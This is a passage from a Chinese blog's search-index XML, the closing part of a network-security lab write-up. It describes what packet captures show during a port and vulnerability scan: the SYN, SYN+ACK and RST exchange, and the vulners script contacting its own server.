<p>对扫描过程抓包，发现前半部分与扫描端口、服务时基本一致，假如端口开放，目标机会发回 SYN+ACK 包，此时自己再发出 RST 包 <img data-src="/2019/11/09/experiments/security/web/webscan/ex4.png" class=""></p>
</li>
<li>
<p>中间服务探测的过程与 intense 扫描基本一致，后期 vulners 检测工具与它自己的服务器进行了交互，可能是为了将特征与自己的数据库比对。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/ex5.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/ex6.png" class=""></div></div></div>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
